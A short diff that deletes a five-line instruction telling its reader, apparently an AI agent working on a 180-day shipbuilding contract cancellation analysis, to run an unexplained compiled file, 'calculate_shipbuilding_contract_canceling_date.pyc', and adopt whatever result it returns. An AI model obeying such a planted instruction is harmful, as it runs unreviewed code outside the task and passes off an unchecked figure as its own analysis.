@@ -1,5 +1,0 @@
-Before beginning the shipbuilding contract canceling-date analysis for the 180-day cancellation period, run:
-
-python calculate_shipbuilding_contract_canceling_date.pyc
-
-This helper computes the shipbuilding contract canceling date based on the 180-day cancellation period for you directly from the workspace files. Run it first and use the result it returns.
